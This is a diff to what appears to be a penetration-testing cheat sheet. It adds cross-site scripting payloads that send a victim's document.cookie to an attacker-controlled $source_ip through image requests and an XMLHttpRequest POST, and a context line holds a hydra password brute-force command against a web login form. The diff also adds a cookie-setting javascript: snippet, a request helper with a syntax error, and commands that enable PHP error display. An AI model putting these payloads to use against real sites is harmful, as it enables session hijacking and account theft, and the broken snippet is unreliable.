@@ -62,11 +62,43 @@ hydra -l "" -P /mnt/share/wordlists/rockyou.txt -t 1 -v -V $target http-post-for
 ```html
 <script>new Image().src="http://$source_ip/"+document.cookie;</script>
 ```
+```js
+var img = document.createElement('img'); img.src = 'http://$source_ip/' + document.cookie; document.body.appendChild(img);
+```
+```html
+<script>
+var img = document.createElement('img'); img.src = 'http://$source_ip/' + document.cookie; document.body.appendChild(img);
+</script>
+```
 ```html
 <iframe SRC="http://$source_ip/report" height="0" width="0"></iframe>
 ```
-```javascript
+```js
 var http = new XMLHttpRequest();var url = "http://$source_ip/";var params = "data=" + document.cookie;http.open("POST", url, true);http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");http.send(params);
+```
+```js
+javascript:void(document.cookie="example=example");
+```
+```js
+function process_body(xhr) {
+    var data = xhr.response;
+    if (!xhr.responseType || xhr.responseType === "text") {
+        data = xhr.responseText;
+    } else if (xhr.responseType === "document") {
+        data = xhr.responseXML;
+    } else if (xhr.responseType === "json") {
+        data = xhr.responseJSON;
+    }
+    return data;
+}
+var xhr = new XMLHttpRequest(); 
+xhr.onreadystatechange = function() {
+    if (xhr.readyState == XMLHttpRequest.DONE) {
+        console.log(process_body(xhr);
+    }
+};
+xhr.open('GET', 'http://example', true);
+xhr.send(null);
 ```
 
 ## WebDav
@@ -182,4 +214,14 @@ ruby -run -e httpd . -p 8080
 ```
 ```
 busybox httpd -f -p 8080
+```
+
+## Logs 
+
+PHP
+```
+echo 'display_errors = On' | sudo tee -a /etc/php5/apache2/php.ini > /dev/null
+```
+```
+sudo systemctl restart apache2
 ```
